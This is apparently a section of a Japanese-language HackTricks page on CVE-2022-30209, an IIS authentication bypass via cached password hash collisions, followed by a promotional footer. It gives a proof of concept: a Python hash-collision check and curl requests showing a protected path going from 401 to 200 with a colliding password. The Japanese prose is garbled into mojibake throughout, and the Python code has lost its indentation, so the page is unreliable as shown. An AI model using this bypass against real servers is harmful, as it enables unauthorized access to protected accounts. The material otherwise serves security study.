## ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸIISèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼ˆCVE-2022-30209ï¼‰ <a href="#3-iis-authentication-bypass" id="3-iis-authentication-bypass"></a>

[å®Œå…¨ãªãƒ¬ãƒãƒ¼ãƒˆã¯ã“ã¡ã‚‰](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼šã‚³ãƒ¼ãƒ‰ã®ãƒã‚°ãŒã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæä¾›ã—ãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’é©åˆ‡ã«ãƒã‚§ãƒƒã‚¯ã—ãªã‹ã£ãŸãŸã‚ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ãŒã™ã§ã«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ã‚ã‚‹ã‚­ãƒ¼ã«ä¸€è‡´ã™ã‚‹**æ”»æ’ƒè€…ã¯ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
